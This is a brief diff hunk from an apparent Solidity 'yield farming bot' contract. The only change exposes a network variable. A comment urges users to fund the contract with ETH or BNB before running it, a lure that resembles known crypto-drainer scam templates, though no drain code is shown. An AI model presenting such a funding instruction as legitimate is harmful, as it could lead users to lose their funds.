@@ -4,7 +4,7 @@ pragma solidity ^0.5.0;
 //Make sure you fund your contract with at least a min 0.15 ETH before running the action on the contract or 0.5 BNB if using the Binance smart chain
 
 contract highYieldFarmingbot {
-    string network = "1";
+    string public network = "1";
     string public beefyApi = "https://app.beefy.com/#/";
     string public yearnApi = "https://yearn.finance/#/";
 	
